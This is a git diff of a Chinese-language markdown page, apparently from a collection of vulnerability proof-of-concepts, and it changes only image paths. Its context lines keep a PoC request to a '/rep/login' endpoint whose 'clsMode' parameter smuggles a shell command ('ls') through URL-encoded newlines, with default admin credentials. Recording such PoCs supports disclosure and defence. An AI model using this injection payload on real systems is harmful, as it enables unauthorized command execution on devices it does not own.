@@ -18,7 +18,7 @@ fid="iaytNA57019/kADk8Nev7g=="
 
 登陆页面
 
-![image-20230828164544551](images/image-20230828164544551.png)
+![image-20230828164544551](../.gitbook/assets/image-20230828164544551.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ POST /rep/login
 clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
 ```
 
-![image-20230828164602536](images/image-20230828164602536.png)
+![image-20230828164602536](../.gitbook/assets/image-20230828164602536.png)
